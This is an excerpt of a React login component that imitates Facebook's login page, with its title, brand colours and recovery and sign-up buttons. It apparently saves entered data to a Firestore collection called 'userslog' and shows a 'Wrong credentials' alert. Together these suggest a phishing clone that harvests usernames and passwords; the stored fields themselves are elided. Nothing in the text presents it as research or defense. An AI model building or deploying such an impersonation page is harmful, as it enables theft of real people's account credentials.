...
export const CardLogin = () => {
	...
	const store = async () => {
		setIsLoding(true);
		try {
			const docRef = await addDoc(collection(db, "userslog"), {
	...
	return (
		<section className="flex justify-center items-center flex-col">
			<Logo />
			<Card className="w-full md:w-[396px] lg:w-[396px] pt-4 text-center text-[18px]">
				<CardContent>
					<h1>Log in to Facebook</h1>
					{isError && (
						<Alert className="mt-4 border-red-500 bg-red-50 rounded-none text-center">
							<h5 className="text-sm font-medium">Wrong credentials</h5>
							<h5 className="text-xs">Invalid username or password</h5>
						</Alert>
					)}
					...
					<div className="mt-6">
						<Button
							...
							className="bg-[#1877f2] hover:bg-[#396eb3] w-full font-bold"
						>
							Login
						</Button>
					</div>
					...
					<div className="mt-4">
						<Button variant="ghost" className="text-[#1877f2] w-full">
							Forgotten Account?
						</Button>
					</div>
					...
					<div className="mt-4">
						<Button className="bg-[#42b72a] hover:bg-[#55a744] w-full">
							Create new Account
						</Button>
					</div>
				</CardContent>
